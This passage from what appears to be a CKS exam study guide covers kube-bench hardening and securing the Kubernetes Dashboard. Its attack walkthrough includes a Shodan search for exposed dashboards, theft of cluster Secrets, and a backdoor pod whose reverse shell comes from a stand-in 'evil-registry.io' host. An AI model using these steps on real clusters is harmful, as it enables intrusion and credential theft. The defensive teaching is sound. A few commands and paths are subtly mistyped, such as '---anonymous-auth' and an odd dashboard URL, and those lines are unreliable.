Impact: Prevents unauthenticated API access — the single most important CIS check. Without this, anyone on the network can query your API. File: /etc/kubernetes/manifests/kube-apiserver.yaml. Add flag: ---anonymous-auth=false. Verify: kube-bench run --check=1.2.1 → must show [PASS]. Test: kubectl get pods --server=https://API_IP:6443 --insecure-skip-tls-verify → should return "Unauthorized" (401).

2️⃣
Enable Audit Logging (CIS 1.2.14, 1.2.22)

Impact: Creates a forensic record of every API call — who did what and when. Essential for breach investigation and compliance. Files: Create /etc/kubernetes/audit-policy.yaml, then add flags to kube-apiserver.yaml: --audit-policy-file, --audit-log-path, --audit-log-maxage=30. Verify: ls /var/log/kubernetes/audit.log — must exist and be non-empty after a kubectl command.

3️⃣
Disable kubelet Read-Only Port (CIS 4.2.5)

Impact: Closes port 10255, which exposes pod lists, container logs, and node metrics with NO authentication. An attacker on the same network can enumerate your entire workload from this port. File: /var/lib/kubelet/config.yaml. Set: readOnlyPort: 0. Verify: curl http://localhost:10255/pods → "Connection refused". Restart: systemctl restart kubelet.

4️⃣
Enable NodeRestriction Admission Plugin (CIS 1.2.9)

Impact: Limits what a compromised kubelet can do. Without NodeRestriction, a kubelet can modify labels, taints, and resources belonging to OTHER nodes — enabling lateral movement from one compromised node to the entire cluster. File: kube-apiserver.yaml. Add NodeRestriction to --enable-admission-plugins list. Verify: kubectl get pods -n kube-system kube-apiserver-* -o yaml | grep NodeRestriction → must appear in the flag.

5️⃣
Enable Encryption at Rest for Secrets (CIS 1.2.31-34)

Impact: Secrets stored in etcd are encrypted with AES-256. Even with direct etcd access, Secrets are unreadable without the encryption key. Files: Create /etc/kubernetes/encryption-config.yaml (EncryptionConfiguration resource), add --encryption-provider-config flag to API server. Verify: Create a test Secret, then check etcd directly — the value must be stored encrypted (k8s:enc:aescbc:v1: prefix). Note: This is covered in detail in Chapter 19 — here we establish that it is a CIS requirement.

Real-World Troubleshooting: When Your CIS Fix Does Not Work

On the exam — and in production — fixes do not always work on the first attempt. Here are the three most common failure patterns, their root causes, and the exact diagnostic commands you need:

🔴 Scenario 1: Edited kube-apiserver.yaml but kube-bench still shows [FAIL]

Root Cause: The API server has not restarted yet, or you edited the wrong manifest file. Kubeadm-based clusters store the manifest at /etc/kubernetes/manifests/kube-apiserver.yaml. But if the cluster was installed with a different tool (kops, k3s, RKE), the path might differ.

Diagnostic Commands:

  # 1. Verify the manifest file path is correct
  $ ps aux | grep kube-apiserver | grep -o 'manifest.*yaml'
  → Should show the actual manifest path being used

  # 2. Check if kubelet detected your change
  $ journalctl -u kubelet --since "2 minutes ago" | grep apiserver
  → Look for "static pod" and "kube-apiserver" messages

  # 3. Force the kubelet to re-sync
  $ systemctl restart kubelet
  → This forces the kubelet to re-read ALL manifests in /etc/kubernetes/manifests/

  # 4. Verify the API server pod is running with your flags
  $ crictl inspect $(crictl ps --name kube-apiserver -q) | grep args
🟡 Scenario 2: Edited kubelet config.yaml but changes are ignored

Root Cause: Command-line flags passed to the kubelet via the systemd service file OVERRIDE settings in /var/lib/kubelet/config.yaml. If a flag like --anonymous-auth=false appears in both the config file AND the systemd drop-in, the CLI value wins. This is a common exam trap.

Diagnostic Commands:

  # 1. Check the ACTUAL kubelet process flags (these override config.yaml)
  $ ps aux | grep kubelet | tr ' ' '\n' | grep anonymous
  → If --anonymous-auth=true appears here, config.yaml is IGNORED

  # 2. Find the systemd drop-in that sets the flag
  $ grep -r "anonymous-auth" /etc/systemd/system/kubelet.service.d/
  → Shows which file has the conflicting flag

  # 3. Fix: remove or change the flag in the systemd file, then restart
  $ systemctl daemon-reload && systemctl restart kubelet
🔴 Scenario 3: kube-bench says [WARN] when you expected [PASS]

Root Cause: kube-bench could not programmatically determine the check result. This often happens when a flag is present but its value is ambiguous, or when a configuration spans multiple files and kube-bench only checks one.

Diagnostic Commands:

  # 1. Run kube-bench in verbose mode for the specific check
  $ kube-bench run --check=1.2.6 -v
  → This shows EXACTLY what kube-bench tested and why it returned [WARN]

  # 2. Manually verify the check
  $ grep authorization-mode /etc/kubernetes/manifests/kube-apiserver.yaml
  → Confirm the flag value matches the CIS recommendation exactly

  # 3. If manually verified correct and kube-bench still says [WARN]:
  → This is a known limitation. Document it. On the exam, [WARN] with
    manual verification may be acceptable if the configuration is correct.

kube-bench in CI/CD — Automating CIS Compliance

On the exam, you run kube-bench manually. In production, you automate it. This section is optional for the exam but essential for real-world operations. Understanding this pattern gives you context for WHY the manual steps exist:

kube-bench as a Kubernetes CronJob — Continuous Compliance
  apiVersion: batch/v1
  kind: CronJob
  metadata:
    name: kube-bench-daily
    namespace: security
  spec:
    schedule: \"0 3 * * *\"           # Run every night at 3 AM
    jobTemplate:
      spec:
        template:
          spec:
            hostPID: true              # Access node's process namespace
            hostNetwork: true          # Access node's network
            nodeSelector:
              node-role.kubernetes.io/control-plane: \"\"
            containers:
            - name: kube-bench
              image: aquasec/kube-bench:latest
              command: [\"kube-bench\", \"run\", \"--targets=master,node\"]
              volumeMounts:
              - name: config
                mountPath: /etc/kubernetes
                readOnly: true
              - name: lib
                mountPath: /var/lib
                readOnly: true
            volumes:
            - name: config
              hostPath:
                path: /etc/kubernetes
            - name: lib
              hostPath:
                path: /var/lib
            restartPolicy: OnFailure

  # This CronJob runs kube-bench EVERY NIGHT on every control plane node.
  # It reads the node's filesystem to check configurations.
  # Results can be forwarded to Elasticsearch, Grafana, or AlertManager.
  # If a previously [PASS] check suddenly becomes [FAIL], an alert fires.
  # This is how you detect configuration drift automatically — no manual
  # audits needed.

CIS Compliance Scorecard — Before vs After for anihpj

🔴 Control Plane Checks — Before Hardening 23/43 PASS (53%)
🟢 Control Plane Checks — After Top 5 Fixes 38/43 PASS (88%)
🔴 Worker Node Checks — Before Hardening 18/35 PASS (51%)
🟢 Worker Node Checks — After kubelet Hardening 31/35 PASS (88%)

📊 Chapter 4 Visual Summary

📏 200+ CIS Checks 5 categories: Control Plane, etcd, Config, Workers, Policies
🔧 kube-bench Automates CIS audits. Pre-installed on CKS exam. Run → Read → Fix → Verify.
📝 API Server Manifest Static pod at /etc/kubernetes/manifests/kube-apiserver.yaml. Edit → kubelet restarts it.
⚙️ kubelet Config /var/lib/kubelet/config.yaml. Restart via systemctl. Disable anonymous, enable webhook.
💡 Key Takeaway for the CKS Exam

The CKS exam hardening workflow is always the same: (1) SSH to the node, (2) run kube-bench, (3) read the FAIL output, (4) edit the file it tells you to edit, (5) add/remove the flag it tells you to change, (6) wait for restart or restart manually, (7) re-run kube-bench to verify [PASS]. Do not improvise. Trust kube-bench. It is your answer key. The exam environment has kube-bench pre-installed. Use it on every hardening task — even if the question does not explicitly tell you to.

How kube-bench Actually Works — The CIS Benchmark Engine Internals

kube-bench is not magic. It is a Go binary that reads the CIS Kubernetes Benchmark specification and executes a series of audit checks — each check is a small program that inspects a specific configuration file, runs a specific command, or queries a specific API endpoint. Understanding how it works internally helps you troubleshoot when a check that should pass fails, or when you need to write custom checks:

kube-bench Architecture — From CIS Spec to PASS/FAIL
  CIS KUBERNETES BENCHMARK (PDF from cisecurity.org)
  │  Contains ~200 checks organized by component:
  │  • 1.1 Master Node Configuration Files (~30 checks)
  │  • 1.2 API Server (~25 checks)
  │  • 1.3 Controller Manager (~10 checks)
  │  • 1.4 Scheduler (~5 checks)
  │  • 2.x etcd (~10 checks)
  │  • 3.x Control Plane Configuration (~20 checks)
  │  • 4.x Worker Node Configuration (~30 checks)
  │  • 5.x Kubernetes Policies (~60 checks)
  │
  ▼  (CIS spec is transcribed into YAML check definitions)
  │
  kube-bench/cfg/cis-1.XX/  (YAML check definitions bundled with kube-bench)
  │
  │  Example check for API server anonymous auth:
  │  ┌──────────────────────────────────────────────────────────┐
  │  │  - id: 1.2.1                                            │
  │  │    text: "Ensure that the --anonymous-auth argument     │
  │  │           is set to false"                               │
  │  │    audit: "ps -ef | grep kube-apiserver | grep -v grep  │
  │  │            | grep anonymous-auth"                        │
  │  │    tests:                                                │
  │  │      test_items:                                         │
  │  │      - flag: "--anonymous-auth"                          │
  │  │        compare:                                          │
  │  │          op: eq                                          │
  │  │          value: false                                    │
  │  │    remediation: "Edit /etc/kubernetes/manifests/         │
  │  │                   kube-apiserver.yaml and set            │
  │  │                   --anonymous-auth=false"                │
  │  │    scored: true                                          │
  │  └──────────────────────────────────────────────────────────┘
  │
  ▼  (kube-bench executes each check's audit command)
  │
  ┌──────────────────────────────────────────────────────────────────┐
  │  CHECK EXECUTION ENGINE                                           │
  │  ────────────────────                                             │
  │  1. For each check, determine the node type (master/worker/etcd) │
  │     based on which components are detected.                       │
  │  2. Execute the audit command (ssh to node, run ps/grep/cat).   │
  │  3. Parse the output and compare against the expected value.     │
  │  4. Determine result:                                             │
  │     • PASS — expected value matched                               │
  │     • FAIL — expected value NOT matched                           │
  │     • WARN — check couldn't be fully verified                     │
  │     • INFO — informational only, not a pass/fail check           │
  └──────────────────────────────────────────────────────────────────┘
  │
  ▼
  OUTPUT: [PASS] 1.2.1 Ensure anonymous-auth is false
          [FAIL] 1.2.6 Ensure --kubelet-certificate-authority is set
          [WARN] 1.2.33 Ensure --encryption-provider-config is set

The scored vs not-scored distinction: CIS assigns each check a "scored" flag. Scored checks count toward compliance scoring. Not-scored checks are best practices that may not apply to every environment. On the CKS exam, focus on scored FAIL items first — these are the ones that cost points. WARN items usually indicate that kube-bench couldn't definitively check the configuration (the file might be in a non-standard location, or the process might not be running on this node type).

Static Pod Manifests — Why Editing /etc/kubernetes/manifests/ Works Instantly

This is the most important Kubernetes internals concept for CKS hardening tasks — and the one that confuses candidates who come from a traditional systemd background. The API server, controller manager, scheduler, and etcd run as static pods — pods managed directly by the kubelet, not by the Kubernetes API server. Here's why that matters:

Static Pod Lifecycle — How Editing a Manifest File Restarts the Control Plane
  THE KUBELET WATCHES /etc/kubernetes/manifests/ EVERY FEW SECONDS
  │
  │  /etc/kubernetes/manifests/
  │  ├── kube-apiserver.yaml          ← kubelet watches this directory
  │  ├── kube-controller-manager.yaml
  │  ├── kube-scheduler.yaml
  │  └── etcd.yaml
  │
  ▼
  WHEN YOU EDIT A MANIFEST (e.g., add --anonymous-auth=false):
  ─────────────────────────────────────────────────────────
  1. You save the file. kubelet detects the change (inotify or periodic poll).
  2. kubelet compares the new manifest to the running pod's hash.
  3. Hash changed → kubelet GRACEFULLY STOPS the running static pod.
  4. kubelet CREATES a new static pod from the updated manifest.
  5. The new pod starts with the NEW flags.
  6. kubelet registers the new pod with the API server.
  │
  ⚡ CRITICAL: If you make a SYNTAX ERROR in the YAML:
  ────────────────────────────────────────────────────
  • kubelet cannot parse the manifest → does NOT stop the running pod.
  • The existing pod keeps running with the OLD configuration.
  • kubectl still works (the old API server is still running).
  • You can FIX the YAML and save again → kubelet will retry.
  │
  🔴 DANGER: If you make a VALID YAML change but with a BROKEN FLAG:
  ───────────────────────────────────────────────────────────────
  • kubelet parses the YAML successfully → stops the OLD pod.
  • kubelet tries to start the NEW pod → the broken flag crashes the binary.
  • Crash → kubelet retries → crash → retry → CrashLoopBackOff.
  • kubectl STOPS WORKING (the API server is DOWN).
  • YOU CANNOT USE kubectl TO FIX IT.
  • RECOVERY: SSH to the control plane node → edit the manifest → FIX the flag →
    kubelet detects the change → starts the new pod with the FIXED flag.
  │
  ⚡ EXAM LESSON: ALWAYS BACKUP THE MANIFEST before editing:
  cp /etc/kubernetes/manifests/kube-apiserver.yaml ~/apiserver.bak
  If the API server doesn't come back, restore the backup via SSH.
← Ch 4: CIS Benchmarks & kube-bench Previous → Ch 5: Securing the Dashboard Next

Chapter 5: Securing the Kubernetes Dashboard & Web UIs

The Kubernetes Dashboard is the most dangerous component you can install — and the most common entry point for attackers. It gives a graphical interface to create, read, update, and delete any resource in your cluster, including pods, secrets, and RBAC rules. With a single misconfiguration — exposing it on a public IP without authentication — you re-create the exact conditions that led to the Tesla breach in 2018. This chapter teaches you how to deploy the Dashboard securely, restrict access with RBAC and NetworkPolicies, and audit your cluster for unnecessary exposed components that attackers use as entry points.

🟢 Beginner ⏱️ ~1 hour 🖥️ Dashboard 🔐 Access Control

🎯 What You'll Learn

  • ✅ Understand why the Kubernetes Dashboard is the #1 attack vector for exposed clusters
  • ✅ Deploy the Dashboard with minimal RBAC — read-only ServiceAccount, no cluster-admin
  • ✅ Configure secure access via kubectl proxy or port-forward — never NodePort or LoadBalancer
  • ✅ Restrict Dashboard access with NetworkPolicy to only trusted admin IPs
  • ✅ Audit your cluster for unnecessary exposed components and remove them
🎓 CKS Relevance
Cluster Setup 15% Cluster Hardening 15%
🧠 The Dashboard Security Rule

The CKS exam tests Dashboard security through two lenses: access restriction and RBAC scoping. If the exam asks you to "secure the Dashboard," you must do TWO things: (1) ensure it is not exposed on a public IP — use ClusterIP + kubectl proxy or port-forward, and (2) ensure the ServiceAccount used by the Dashboard has minimal RBAC permissions — ideally read-only and namespace-scoped. Missing either one = incomplete answer.

5.1 Why the Dashboard Is Dangerous

The Kubernetes Dashboard is not inherently insecure — but its default deployment model is. When you install the Dashboard from the official manifest without modifications, it creates a ServiceAccount with cluster-admin privileges and exposes a web interface. If that web interface is reachable from the internet — through a LoadBalancer Service, a NodePort, or an Ingress without authentication — anyone with a browser can manage your entire cluster. This is not a hypothetical scenario. It is exactly how Tesla was breached in 2018: attackers found an exposed Dashboard, used its admin privileges to deploy crypto-mining containers, and extracted AWS credentials from the cluster environment.

🔴 The Tesla Breach — A Dashboard Story

Tesla's Kubernetes Dashboard was accessible from the public internet with no authentication required. The Dashboard's default ServiceAccount had cluster-admin. Attackers used Shodan (a search engine for internet-connected devices) to find the Dashboard, logged in without credentials, deployed crypto-mining pods, and extracted AWS IAM credentials stored in Kubernetes Secrets — all through the Dashboard's point-and-click interface. No exploit was needed. No vulnerability was exploited. The attack succeeded because the Dashboard was exposed and over-privileged — two defaults that the CKS curriculum teaches you to fix.

Dashboard Exposure Risk Matrix

How Is Dashboard Exposed?Risk LevelWhat Attacker Can DoExample
Public Internet, No Auth (LoadBalancer/NodePort)🔴 CRITICALFull cluster access — create, delete, read any resource, exec into any pod, read all SecretsTesla 2018: crypto-mining + AWS credential theft
Public Internet, With Token (no extra network controls)🟠 HIGHIf the token is stolen — full accessToken exposure via developer laptop compromise
Internal Only, with RBAC (ClusterIP, limited SA)🟡 MEDIUMLimited to what scoped RBAC allowsInsider threat with valid credentials
kubectl proxy Only (localhost) + strong RBAC + no public exposure🟢 LOWOnly the person running kubectl proxy can access itSecure admin workflow — the CKS-recommended pattern

What the Dashboard Can Do — And Why That Matters

Many administrators underestimate the Dashboard because they think of it as "just a UI." But the Dashboard exposes every API verb on every resource type that its ServiceAccount has access to. With cluster-admin (the default), that means:

📦
Workload Control

Create, scale, edit, and delete Deployments, StatefulSets, DaemonSets, Jobs, and CronJobs. Deploy backdoors as innocent-looking pods.

🔑
Secret Access

View and decode ALL Secrets in all namespaces — database passwords, API keys, TLS private keys, cloud credentials.

🐚
Pod Shell Access

Click a button to get a terminal shell inside ANY running container — no kubectl needed.

⚠️ The Dashboard Is a Cluster-Admin GUI — Treat It Like One

The Dashboard is not a monitoring tool. It is not a read-only status page. It is a full-control graphical interface to the Kubernetes API. Every security control you apply to kubectl access — RBAC, OIDC, audit logging — must also be applied to the Dashboard. If you would not give every developer cluster-admin via kubectl, do not give it to them via the Dashboard.

How Attackers Find Exposed Dashboards — The Shodan Connection

Shodan is a search engine that indexes internet-connected devices — not web pages. It constantly scans the entire IPv4 address space, fingerprinting services on every port. When it finds a service responding on port 443 or 8443 with Kubernetes-specific HTTP headers (Audit-Id, Kubernetes response headers), it tags it as a Kubernetes API or Dashboard. An attacker simply searches Shodan for product:"Kubernetes" and gets a list of IP addresses with exposed Dashboards — complete with screenshots of the login page. If the Dashboard's "Skip" button is enabled (which it is by default in older versions), the attacker clicks it and gains cluster-admin access. No exploit. No vulnerability. Just a search engine query and a browser. This is not a theoretical attack path — this is exactly what happened to Tesla, and it is what continues to happen to hundreds of unsecured clusters discovered every month.

Dashboard vs kubectl — Why the GUI Is More Dangerous

At first glance, the Dashboard seems equivalent to kubectl — both are clients that talk to the same API server with the same RBAC rules. But the Dashboard introduces unique risks that kubectl does not:

Attack SurfacekubectlDashboard
Network ExposureLocal CLI tool. No listening port. No network exposure.Web server listening on a port. If exposed via LB/NodePort/Ingress, reachable from anywhere.
Phishing RiskNone. kubectl is a terminal program.HIGH. A fake Dashboard login page can steal bearer tokens. Tokens grant permanent API access.
Session PersistenceNo session. Each kubectl command is a discrete API call.Browser session with a stored token. If the browser is compromised (XSS, malicious extension), the token is stolen.
CSRF VulnerabilityNot applicable. No browser involved.Without CSRF protection, a malicious website can make Dashboard API calls using the user's authenticated session.
Audit Trail Claritykubectl commands are clearly logged with user identity.All Dashboard actions appear as the Dashboard's ServiceAccount in audit logs — individual user identity is lost unless OIDC is configured.
"Skip" ButtonNo equivalent. kubectl always requires credentials.Older Dashboard versions have a "Skip" button that bypasses authentication entirely. This is how Tesla was breached.

The "Skip" Button — Tesla's Fatal Misconfiguration

Kubernetes Dashboard versions prior to 2.0.0 included a "Skip" button on the login page. This button was not a bug — it was a deliberate feature for development environments. When clicked, it granted the user the Dashboard ServiceAccount's permissions with zero authentication. Since the default Dashboard ServiceAccount had cluster-admin, clicking "Skip" gave full cluster control to anyone who could reach the login page. Tesla's Dashboard had this button enabled AND was exposed on the public internet. The attacker did not need a password, a token, or an exploit. They clicked a button. In Dashboard 2.0.0+, the "Skip" button is disabled by default, but it can still be re-enabled with the --enable-skip-login flag. Never use this flag in any environment — including development.

Dashboard Attack Walkthrough — The Exact Sequence

This is the attacker's perspective — the exact steps that compromised Tesla and continue to compromise unsecured clusters every day:

Phase 1-2: Discovery → Access (under 2 minutes)
  $ shodan search 'product:"Kubernetes" ssl:"Dashboard"' --fields ip_str,port
  203.0.113.42  8443    ← Exposed Dashboard found

  Attacker opens https://203.0.113.42:8443 in a browser.
  → Dashboard login page. "Skip" button present.
  → Click "Skip" → Logged in as cluster-admin.
  → No password. No token. No exploit required.

  PHASE 3: Credential Extraction (2 minutes)
  ─────────────────────────────────────────
  Dashboard → Config & Storage → Secrets → anihpj-prod
  → anihpj-db-credentials: DATABASE_URL=postgres://user:pass@db:5432/jobpost
  → aws-s3-backup: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY
  → anihpj-tls: TLS private key for anihpj.com

  PHASE 4: Persistence (3 minutes)
  ────────────────────────────────
  Dashboard → Workloads → Create → Pod
  Name: nginx-backdoor
  Image: evil-registry.io/reverse-shell:latest
  → Pod deploys. Reverse shell calls home. Permanent access established.

  TOTAL: ~7 minutes. Attacker has: all Secrets, cloud credentials, backdoor.

Dashboard Deployment Decision Tree

🖥️ Do you truly need a web UI, or is kubectl/k9s/Lens sufficient?
❌ kubectl is enough → Skip Dashboard entirely. Zero attack surface is always more secure.
✅ UI needed → Continue.
🔐 Can you enforce OIDC with MFA (Google, Azure AD, Okta)?
✅ Yes → Deploy with OIDC + ClusterIP + NetworkPolicy. Enterprise-grade. Users authenticate via IdP.
⚠️ No OIDC → Use kubectl port-forward + scoped SA token only. Never expose on network.
🌐 Does access need to work remotely?
✅ Local only → kubectl proxy on localhost. Zero network exposure.
⚠️ Remote → VPN only. NetworkPolicy restricts to VPN CIDR. Never public internet.

5.2 Deploying Dashboard Securely

Securing the Dashboard involves three independent controls that must all be applied: network isolation (no public IP), authentication (token or OIDC required), and authorization (RBAC-scoped ServiceAccount). Any single control missing re-opens the attack surface.

Secure Dashboard Access — The Correct Workflow

❌ Insecure — Never Do This
  • kubectl expose deploy kubernetes-dashboard --type=LoadBalancer --port=443
  • Dashboard on a public IP — anyone can reach it
  • Default ServiceAccount has cluster-admin
  • No NetworkPolicy restricting access
  • No OIDC or token authentication enforced

RESULT: Tesla breach redux. Attacker finds your Dashboard on Shodan.

✅ Secure — The CKS Way
  • Step 1: Dashboard Service type is ClusterIP (internal only)
  • Step 2: kubectl port-forward -n kubernetes-dashboard svc/kubernetes-dashboard 8443:443
  • Step 3: Access at https://localhost:8443 — only from your local machine
  • Step 4: Login with a scoped ServiceAccount token (read-only, namespace-scoped)
  • Step 5: NetworkPolicy denies ALL ingress to Dashboard except from admin machines

RESULT: Zero network exposure. Token-scoped access. Secure.

Creating a Restricted ServiceAccount for Dashboard

The Dashboard's default ServiceAccount has cluster-admin. The first hardening step is creating a dedicated, restricted ServiceAccount with read-only access scoped to specific namespaces:

Restricted Dashboard ServiceAccount — read-only, namespace-scoped
  apiVersion: v1
  kind: ServiceAccount
  metadata:
    name: dashboard-reader
    namespace: kubernetes-dashboard
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: dashboard-readonly
  rules:
  - apiGroups: [""]
    resources: ["pods", "services", "configmaps", "persistentvolumeclaims"]
    verbs: ["get", "list", "watch"]        # READ ONLY
  # NOTE: Secrets deliberately NOT included.
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    name: dashboard-reader-binding
  subjects:
  - kind: ServiceAccount
    name: dashboard-reader
    namespace: kubernetes-dashboard
  roleRef:
    kind: ClusterRole
    name: dashboard-readonly
    apiGroup: rbac.authorization.k8s.io
  ---
  $ kubectl create token dashboard-reader -n kubernetes-dashboard
  → Use THIS token to log in — NOT the admin token.

NetworkPolicy — Restrict Dashboard Access to Admin IPs

Only allow Dashboard access from admin IP 10.0.0.100
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: dashboard-access
    namespace: kubernetes-dashboard
  spec:
    podSelector:
      matchLabels:
        k8s-app: kubernetes-dashboard
    policyTypes:
    - Ingress
    ingress:
    - from:
      - ipBlock:
          cidr: 10.0.0.100/32             # Only this admin IP
      ports:
      - port: 8443
    # All other traffic → DENIED

  # VERIFY:
  $ kubectl run test --rm -it --image=busybox -- sh
  / # wget -O- https://kubernetes-dashboard.kubernetes-dashboard:8443
  → Connection TIMEOUT (blocked by NetworkPolicy)
💡 OIDC — The Enterprise Authentication Pattern

For production clusters, token-based auth is insufficient — tokens are static, long-lived, and easy to leak. The enterprise pattern is OIDC integration: configure the API server with --oidc-issuer-url and --oidc-client-id pointing to your identity provider (Google Workspace, Azure AD, Okta). The Dashboard then redirects users to the IdP for login, which can enforce MFA, device trust, and session timeouts. OIDC is covered in detail in Chapter 8.

How the Dashboard Token Login Actually Works

Understanding the internal flow helps you diagnose authentication issues on the exam. When you paste a token into the Dashboard login page, here is exactly what happens behind the scenes:

Dashboard Token Authentication — Internal Flow
  1. You paste a bearer token into the Dashboard login page and click "Sign In"

  2. The Dashboard stores the token in the browser's localStorage:
     localStorage.setItem('kubernetes-dashboard-token', '')
     ⚠️  This means ANY JavaScript running in the browser context
         (including malicious browser extensions) can read this token.

  3. Every Dashboard API request includes the token as an HTTP header:
     Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...

  4. The API server receives the request → extracts the token → validates:
     a. Is the JWT signature valid? (signed by the SA token controller)
     b. Is the token expired? (if using bound tokens with expiration)
     c. Is the ServiceAccount still active?

  5. If valid → the API server identifies the user as:
     system:serviceaccount::
     And checks RBAC: does this SA have the requested permission?

  6. The Dashboard UI renders based on what the API returns.
     Resources the SA cannot see → simply do not appear in the UI.
     (This is why read-only SAs see pods but not Secrets — RBAC hides them.)

  🔑 KEY INSIGHT: The Dashboard has NO authentication logic of its own.
     It is a transparent proxy. All auth decisions are made by the API server.
     This means securing the Dashboard = securing the API server's RBAC.

Verifying Your Dashboard Is Actually Secure — A Checklist

After configuring the Dashboard, run through these verification steps. On the CKS exam, one of these checks may reveal that you missed a step:

✅ Dashboard Security Verification Checklist
  • Check 1: Network exposure. kubectl get svc -n kubernetes-dashboard — TYPE must be ClusterIP. If it is NodePort or LoadBalancer, fix it immediately.
  • Check 2: External reachability. From a machine outside the cluster, try curl -k https://<any-node-ip>:<nodeport> — must return "Connection refused" or timeout. If it returns HTML, your Dashboard is exposed.
  • Check 3: Token scope. kubectl auth can-i --list --as=system:serviceaccount:kubernetes-dashboard:dashboard-reader — verify that only read-only verbs appear. If "create", "delete", or "*" appear, the SA is over-privileged.
  • Check 4: Secret access. kubectl auth can-i get secrets --as=system:serviceaccount:kubernetes-dashboard:dashboard-reader — must return "no". The Dashboard SA should NEVER be able to read Secrets.
  • Check 5: NetworkPolicy enforcement. From any pod in a different namespace, try curl https://kubernetes-dashboard.kubernetes-dashboard:8443 — must timeout. If it connects, your NetworkPolicy is not working.
  • Check 6: Skip button. Access the Dashboard URL and verify the login page does NOT have a "Skip" button. If it does, the --enable-skip-login flag is set — remove it immediately.

5.3 Removing Unnecessary Components

Security is not just about configuring things correctly — it is also about removing things you do not need. Every component, every open port, every installed add-on is part of your attack surface. The CIS Benchmark explicitly requires you to audit your cluster for unnecessary components.

📖 The Principle of Minimization

The fewer components running, the fewer targets for attackers. The fewer open ports, the fewer entry points. The fewer RBAC permissions, the less damage from a compromised credential. If you do not need it, remove it. Before installing the Dashboard, ask: "Do I actually need it, or can I manage this cluster with kubectl?"

Pre-Production Cluster Component Audit Checklist

The Component Audit — 10 Questions to Ask
  □ Is Dashboard installed? → Only accessible via port-forward or VPN?
  □ Any LoadBalancer Services? → Audit every one.
  □ Any NodePort Services? → Opens on EVERY node.
  □ --insecure-port=0 on API server?
  □ kubelet readOnlyPort: 0?
  □ Any pods using hostNetwork: true unnecessarily?
  □ Any pods using hostPID: true unnecessarily?
  □ Any pods using privileged: true unnecessarily?
  □ Any pods with dangerous Linux capabilities (SYS_ADMIN, NET_RAW)?
  □ Any alpha feature gates enabled? (--feature-gates=...)
  □ Any wildcard (*) RBAC bindings?
  □ Any Services with externalIPs set?
  □ Any unused namespaces with lingering resources?

Beyond the Checklist — Three Critical Minimizations

Three items on the checklist deserve extra attention because they are commonly overlooked — and each one enables container escape or cluster compromise:

⚠️
Privileged Pods

privileged: true in a SecurityContext gives the container ALL Linux capabilities and access to ALL host devices. This is essentially the same as running as root on the node. Never use privileged unless absolutely required — and if required, isolate those pods with PodSecurity, NetworkPolicy, and runtime sandboxing. Audit: kubectl get pods -A -o json | jq '.items[]|select(.spec.containers[].securityContext.privileged==true)|.metadata.name'

🧪
Alpha Feature Gates

Kubernetes alpha features are disabled by default for a reason — they are unstable, poorly tested, and may have unknown security implications. Enabling alpha feature gates on a production cluster expands your attack surface with untested code. Audit the API server manifest for --feature-gates=... flags. Every alpha feature enabled is a potential vulnerability. Remove any that are not explicitly required for your workload.

🔌
VPN-Only Access

kubectl proxy and port-forward are secure because they bind to localhost. But they require an SSH session to a node or a local kubeconfig. The enterprise alternative is VPN-only Dashboard access: the Dashboard is a ClusterIP service, and the VPN subnet is the only CIDR allowed in the NetworkPolicy. This allows remote access while maintaining zero public exposure. No VPN connection = no Dashboard. Simple and secure.

Critical Ports — What Should (and Should NOT) Be Open

PortComponentShould It Be Open?Action If Unnecessary
6443API Server (secure)✅ RequiredRestrict with firewall to trusted IPs only
2379etcd client✅ API server onlyFirewall: restrict to API server IP only
10250kubelet API⚠️ Internal onlyWebhook auth required
10255kubelet read-only🔴 DISABLEreadOnlyPort: 0. No auth on this port.
8080API Server insecure🔴 DISABLE--insecure-port=0
8001kubectl proxy⚠️ Localhost onlyBind to 127.0.0.1 only
30000-32767NodePort range⚠️ Audit carefullyOpens on every node's public interface

How to Actually Remove and Verify Component Cleanup

The audit checklist tells you what to look for — but you also need to know the exact commands to fix each finding. Here is the actionable remediation for every checklist item, plus verification that the fix took effect:

Component Audit → Fix → Verify — The Complete Workflow
  FINDING 1: Dashboard installed but unused
  ─────────────────────────────────────────
  FIX:    kubectl delete -f https://raw.githubusercontent.com/kubernetes/dashboard/v3.0.0/aist/deploy/recommended.yaml
          kubectl delete ns kubernetes-dashboard
  VERIFY: kubectl get ns kubernetes-dashboard → "Error from server (NotFound)"

  FINDING 2: Unnecessary LoadBalancer Services
  ──────────────────────────────────────────────
  FIX:    kubectl patch svc <name> -n <ns> -p '{"spec":{"type":"ClusterIP"}}'
          # This removes the cloud load balancer and the public IP
  VERIFY: kubectl get svc <name> -n <ns> → TYPE must now be ClusterIP

  FINDING 3: Unnecessary NodePort Services
  ─────────────────────────────────────────
  FIX:    Same as LoadBalancer — change type to ClusterIP
  VERIFY: kubectl get svc -A | grep NodePort → should return nothing
          (or only intentional, documented NodePorts)

  FINDING 4: Pods with hostNetwork: true
  ───────────────────────────────────────
  FIX:    Edit the Deployment/DaemonSet and remove hostNetwork: true
  VERIFY: kubectl get pods -A -o json | jq '.items[]|select(.spec.hostNetwork==true)|.metadata.name'
          → Should return nothing (or only documented, intentional pods)

  FINDING 5: Wildcard RBAC bindings
  ──────────────────────────────────
  FIX:    kubectl delete clusterrolebinding <binding-name>
          Then create a properly scoped replacement with specific users/groups
  VERIFY: kubectl get clusterrolebindings -o yaml | grep -c '\*'
          → Should be 0 (or only documented, intentional wildcards)

  FINDING 6: Services with externalIPs
  ─────────────────────────────────────
  FIX:    kubectl patch svc <name> -n <ns> --type json \
            -p='[{"op":"remove","path":"/spec/externalIPs"}]'
  VERIFY: kubectl get svc -A -o yaml | grep externalIPs
          → Should return nothing

How CIS Benchmark 5.x Maps to Unnecessary Component Removal

The CIS Kubernetes Benchmark dedicates an entire section (Section 5) to policies that govern what should and should not be running in your cluster. These checks are directly relevant to the CKS exam because they represent the most common configuration mistakes that lead to breaches. Understanding this mapping helps you connect the audit checklist above back to specific CIS controls:

CIS CheckRequirementWhy It MattersHow It Connects to anihpj
5.1.1Ensure ClusterRoleBindings do not use wildcardsA wildcard ClusterRoleBinding grants every ServiceAccount cluster-admin. One compromised pod = total cluster takeover.If anihpj's default SA has a wildcard binding, the Django pod can read Secrets from kube-system.
